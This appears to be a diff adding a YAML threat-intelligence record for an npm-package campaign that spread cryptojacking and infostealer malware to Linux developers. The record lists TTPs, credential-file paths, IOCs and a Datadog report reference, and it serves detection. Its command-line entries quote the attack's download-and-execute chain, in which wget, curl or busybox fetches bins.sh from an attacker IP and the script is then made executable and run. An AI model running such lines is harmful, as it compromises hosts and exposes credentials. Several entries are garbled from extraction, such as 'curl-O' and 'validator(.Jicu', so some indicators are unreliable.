@@ -1,0 +1,88 @@
+description: Threat actors compromised npm packages to distribute cryptojacking and
+  infostealer malware, targeting Linux developers through malicious npm packages.
+malware_families:
+- cryptojacking
+- infostealer
+- XMRig fork
+TTPs:
+  processes:
+  - node
+  - npm
+  - cmd.exe
+  - powershell.exe
+  - wget
+  - curl
+  - bash
+  - busybox
+  - /usr/bin/x-ui
+  - /usr/bin/wget
+  commandline:
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /rm bins.sh
+  - wget http://37.44.238.88/bins.sh
+  - curl -O http://37.44.238.88/bins.sh
+  - /bin/busybox wget http://37.44.238.88/bins.sh
+  - chmod 777 bins.sh
+  - ./bins.sh
+  - cd/tmp||cd/var/run||cd/mnt||cd/root||cd/rm
+  - wget http[://]37.44[.]238.88/bins.sh
+  - curl-O http[://]37.44[.]238.88/bins.sh
+  - /bin/busybox wget http[://]37.44[.]238.88/bins.sh
+  - tvy Mining begins on malicious package via npm
+  - npm install @rspackicore/1.1.7
+  - npm install @rspackicli/1.1.7
+  - MUT-6149SSH key into compromised host via SSH
+  powershell: []
+  scripting_engine:
+  - Python
+  - VBScript
+  - VBS
+  - JScript
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName
+  - HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName%COMPUTERNAME%
+  image_load: []
+  network_connections:
+  - 37.44.238.88
+  - https://ipinfo.io/ip
+  - https://grammy.validator.icu
+  - 80.78.28.72/tokens
+  - wget http[://]37.44[.]238.88/bins.sh
+  - curl-O http[://]37.44[.]238.88/bins.sh
+  - https://grammy.validator(.Jicu
+  file_activity:
+  - /tmp/vant
+  - /home/username/.aliyun/config.json
+  - /home/username/.hcloud/config.json
+  - /home/username/.tccli/default.credential
+  - /home/username/.ssh/authorized_keys
+  - /usr/bin/x-ui
+  - /usr/bin/wget
+  - /usr/bin/x-ui-linux-amde4.targz
+  persistence:
+  - SSH key backdoor via malicious npm packages
+  - XorBot botnet multi-stage payload
+  process_relations:
+  - fusr/bin/bash -> fusr/bin/wget
+IOCs:
+  hashes:
+  - 512c85432f47149b04a2620dea12b2520857884e398b886d768468a16ced73d5
+  ip_addresses:
+  - 37.44.238.88
+  - 80.78.28.72
+  domains: []
+  urls:
+  - http://37.44.238.88/bins.sh
+  - https://ipinfo.io/ip
+  - https://grammy.validator.icu
+  - http[://]37.44[.]238.88/bins.sh
+  - https://grammy.validator(.Jicu
+  - https://raw.githubusercontent.com/vaxilu/x-ui/main/x-ui....
+authors:
+- Matt Muir
+- Frederic Baguelin
+- Nathaniel Beckstead
+- Greg Foss
+- Adrian Korn
+reference: https://securitylabs.datadoghq.com/articles/2025-q1-threat-roundup
+date_of_publication: April 17, 2025
+file_creation_date: December 15, 2025
